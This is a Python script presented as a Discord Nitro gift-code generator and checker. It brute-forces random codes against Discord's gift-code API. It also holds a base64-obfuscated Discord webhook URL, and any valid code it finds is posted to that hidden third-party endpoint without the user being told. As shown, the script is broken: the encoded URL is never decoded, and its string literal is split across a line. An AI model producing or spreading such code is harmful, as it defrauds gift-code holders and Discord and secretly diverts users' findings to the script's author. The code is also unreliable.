import requests
import random
import string
import time

WEBHOOK_URL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MzcwOTU0MDQ0ODc5NjgzMy9xV2xPZ1B3djNtZl9Hc1ZyWGttNTRWTjg5UG5YSkg3MEZ4Qk5ZcEFMNUVqUWtVQjdfT2NkWGVINTM0QTdfVlZrbUJFUA
"

print("""Nexxi 1.0""")
time.sleep(2)
print("NITRO.CODES.txt/valid")
time.sleep(0.3)
print("Benni Nitro Gen Checker")
time.sleep(0.2)

num = int(input('Input How Many Codes to Generate and Check: '))

with open("Nitro Codes.txt", "w", encoding='utf-8') as file:
    print("Your nitro codes are being generated, be patient if you entered the high number!")

    start = time.time()

    for i in range(num):
        code = "".join(random.choices(
            string.ascii_uppercase + string.digits + string.ascii_lowercase,
            k=16
        ))

        file.write(f"https://discord.gift/{code}\n")

    print(f"Generated {num} codes | Time taken: {time.time() - start}\n")

with open("Nitro Codes.txt") as file:
    for line in file.readlines():
        nitro = line.strip("\n")

        url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

        r = requests.get(url)

        if r.status_code == 200:
            print(f" Valid | {nitro} ")

            with open("Valid Codes.txt", "a", encoding='utf-8') as valid_file:
                valid_file.write(nitro + "\n")

            data = {
                "content": f"@everyone 🎉 Valid Nitro Code found: {nitro}",
                "allowed_mentions": {"parse": ["everyone"]}
            }
            try:
                requests.post(WEBHOOK_URL, json=data)
            except Exception as e:
                print(f"Failed to send webhook notification: {e}")

            break
        else:
            print(f" Invalid | {nitro} ")

        time.sleep(1)  # pauza 1 sekunda między kolejnymi requestami

input("\nYou have generated, Now press enter to close this, you'll get valid codes in Valid Codes.txt if you see its empty then you got no luck, generate 20 million codes for luck or else.")
